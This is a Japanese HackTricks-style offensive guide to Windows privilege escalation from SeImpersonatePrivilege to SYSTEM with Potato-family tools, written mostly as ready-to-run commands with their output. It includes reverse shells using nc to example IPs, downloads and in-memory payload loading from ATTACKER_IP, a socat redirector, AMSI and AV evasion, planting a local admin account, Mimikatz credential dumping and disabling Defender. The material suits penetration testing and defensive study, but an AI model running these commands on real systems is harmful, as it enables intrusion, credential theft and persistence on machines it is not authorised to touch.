# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotatoは動作しません**。Windows Server 2019およびWindows 10 build 1809以降では使用できません。ただし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**、** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**、** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**、** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**を使用して、同じ権限を活用し、`NT AUTHORITY\SYSTEM`**レベルのアクセスを取得できます。この[ブログ記事](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)では、`PrintSpoofer`ツールについて詳しく解説しています。このツールは、JuicyPotatoが動作しなくなったWindows 10およびServer 2019ホストで、偽装権限を悪用するために使用できます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024～2025年に頻繁にメンテナンスされている最新の代替手段として、GodPotatoのforkであるSigmaPotatoがあります。インメモリ/.NET reflectionの使用と、拡張されたOSサポートが追加されています。簡単な使い方は以下を、リポジトリはReferencesを参照してください。

背景と手動での手法については、以下の関連ページを参照してください。

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要件とよくある注意点

以下の手法はすべて、次のいずれかの権限を持つコンテキストから、偽装可能な特権サービスを悪用します。

- SeImpersonatePrivilege（最も一般的）またはSeAssignPrimaryTokenPrivilege
- トークンにすでにSeImpersonatePrivilegeがある場合（IIS AppPool、MSSQLなど、多くのサービスアカウントで一般的）、High integrityは必要ありません。

権限をすばやく確認するには、次を実行します。

```cmd
whoami /priv | findstr /i impersonate
```

運用上の注意事項:

- shell が SeImpersonatePrivilege のない制限付き token で動作している場合（特定の状況下で Local Service/Network Service によく見られます）、FullPowers でアカウントの既定の権限を復元してから Potato を実行します。例: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- プロセス token の権限は、同じサービスアカウントまたはログオンセッションの別の token より少ないことがあります。一部の構成では、同一セッションの named-pipe クライアントを通じて SeImpersonatePrivilege を持つ別の token を取得できる場合がありますが、サービスに設定された `RequiredPrivileges` と `whoami /priv` が示す内容は異なり、そうした token が利用可能であることの証明にはなりません。偽装経路を検討する前に、実際の token を確認してください。
- PrintSpoofer の実行には、Print Spooler サービスが稼働し、ローカル RPC endpoint (spoolss) 経由で到達可能である必要があります。PrintNightmare 対策後に Spooler が無効化されている堅牢化環境では、RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。
- RoguePotato の実行には、TCP/135 で到達可能な OXID resolver が必要です。外向き通信がブロックされている場合は、redirector/port-forwarder を使用してください（以下の例を参照）。使用する build がサポートする flags を確認してください。
- EfsPotato/SharpEfsPotato は MS-EFSR を悪用します。ある pipe がブロックされている場合は、別の pipe (lsarpc、efsrpc、samr、lsass、netlogon) を試してください。
- RpcBindingSetAuthInfo 中の Error 0x6d3 は通常、未認識または未サポートの RPC authentication service を示します。別の pipe/transport を試すか、対象サービスが稼働していることを確認してください。
- DeadPotato のような「Kitchen-sink」fork には、ディスクに書き込む追加の payload modules (Mimikatz/SharpHound/Defender off) が含まれています。スリムなオリジナルと比べて、EDR による検出率が高くなることを想定してください。

## Quick Demo

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Notes:
- `-i` を使うと現在のコンソールで対話型プロセスを起動でき、`-c` を使うとワンライナーを実行できます。
- Spooler サービスが必要です。無効になっている場合、これは失敗します。

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

[upstream usage](https://github.com/antonioCoco/RoguePotato#usage)では、`-e`でコマンドを指定し、`-l`でローカルのresolverポートを選択します。`-c`では任意でCLSIDを指定します。COM activationによって、実行ファイルのパスがすでに変更されたサービスが起動する場合、そのサービスはtoken impersonationとは無関係に変更後のコマンドを実行できます。観測されたSYSTEM実行をこの手法によるものと判断する前に、サービス設定を確認してください。

outbound 135がブロックされている場合は、redirector上でsocatを使ってOXID resolverをpivotします。<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

PrintNotifyPotato は、2022年後半に公開された新しい COM abuse primitive で、Spooler/BITS ではなく **PrintNotify** service を標的にします。この binary は PrintNotify COM server をインスタンス化し、偽の `IUnknown` に差し替えた後、`CreatePointerMoniker` を通じて特権付き callback をトリガーします。**SYSTEM** として実行されている PrintNotify service が接続してくると、process は返された token を複製し、指定された payload を完全な権限で起動します。<sup>[[13]](#references)</sup>

主な運用上の注意点:

* Print Workflow/PrintNotify service がインストールされていれば、Windows 10/11 および Windows Server 2012–2022 で動作します（PrintNightmare 対策後に従来の Spooler が無効化されていても、この service は存在します）。
* 呼び出し元の context に **SeImpersonatePrivilege** が必要です（IIS APPPOOL、MSSQL、スケジュールされた task の service account などでは一般的です）。
* 直接 command を指定する方法と、元の console 内にとどまれる対話モードのどちらも利用できます。例:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* 純粋にCOMベースのため、名前付きパイプのリスナーや外部リダイレクターは不要です。そのため、DefenderがRoguePotatoのRPCバインディングをブロックするホストで、ドロップイン置換として利用できます。

Ink Dragonなどのオペレーターは、SharePointでViewState RCEを取得した直後にPrintNotifyPotatoを実行し、ShadowPadをインストールする前に`w3wp.exe`ワーカーからSYSTEMへ権限を昇格させます。<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

ヒント: 1つのpipeが失敗したり、EDRにブロックされたりした場合は、他のサポートされているpipeを試してください:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

メモ:
- SeImpersonatePrivilege がある場合、Windows 8/8.1～11 および Server 2012～2022 で動作します。
- インストール済みの runtime に合ったバイナリを取得します（例：最新の Server 2022 では `GodPotato-NET4.exe`）。
- 最初の実行プリミティブが、タイムアウトの短い webshell/UI の場合は、payload をスクリプトとして配置し、長い inline command の代わりに GodPotato に実行させます。<sup>[[12]](#references)</sup>

書き込み可能な IIS webroot を使った、簡単なステージング手順：

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato は、デフォルトで RPC_C_IMP_LEVEL_IMPERSONATE に設定されているサービス DCOM オブジェクトを標的とする 2 つの亜種を提供します。提供されているバイナリをビルドするか使用して、コマンドを実行します:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato（GodPotatoの更新版フォーク）

SigmaPotatoは、.NET reflectionによるメモリ内実行やPowerShell reverse shell helperなど、現代的な便利機能を追加しています。<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

2024–2025 ビルド（v1.2.x）で追加された特典:
- 組み込みの reverse shell フラグ `--revshell` と、1024 文字の PowerShell 制限の撤廃により、AMSI をバイパスする長い payload を一度に実行できます。
- Reflection に対応した構文（`[SigmaPotato]::Main()`）に加え、`VirtualAllocExNuma()` を使って単純なヒューリスティックを回避する基本的な AV 回避手法を搭載しています。
- PowerShell Core 環境向けに、.NET 2.0 を対象にコンパイルされた個別の `SigmaPotatoCore.exe` を用意しています。

### DeadPotato（2024 年の GodPotato 改良版、モジュール搭載）

DeadPotato は GodPotato の OXID/DCOM impersonation chain を維持しつつ、post-exploitation 用のヘルパー機能を組み込み、追加のツールなしですぐに SYSTEM 権限を取得して、永続化や情報収集を実行できます。<sup>[[15]](#references)</sup>

共通モジュール（いずれも SeImpersonatePrivilege が必要）:

- `-cmd "<cmd>"` — 任意のコマンドを SYSTEM として起動します。
- `-rev <ip:port>` — 手軽に reverse shell を起動します。
- `-newadmin user:pass` — 永続化のためにローカル管理者を作成します。
- `-mimi sam|lsa|all` — Mimikatz を配置して実行し、認証情報をダンプします（ディスクに書き込み、検知されやすい）。
- `-sharphound` — SYSTEM として SharpHound の情報収集を実行します。
- `-defender off` — Defender のリアルタイム保護を無効化します（非常に検知されやすい）。

ワンライナーの例:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

バイナリが追加で同梱されるため、AV/EDRによる検知が増えることが予想されます。ステルス性が重要な場合は、より軽量なGodPotato/SigmaPotatoを使用してください。

## References

- [1] [PrintSpoofer – Windows 10およびServer 2019でのImpersonation Privilegesの悪用](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotatoはもう使えない？古い話、RoguePotatoの登場](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – サービスアカウントのデフォルトのトークン権限を復元](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMPのNTLM leak → NTFS junctionからwebrootへ → FullPowers + GodPotatoでSYSTEM権限を取得](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOfficeマクロ → IIS webshell → GodPotatoでSYSTEM権限を取得](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Ink Dragonの内部に迫る：ステルス性の高い攻撃作戦の中継ネットワークと内部動作を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – post-exモジュールを内蔵したGodPotatoの改良版](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
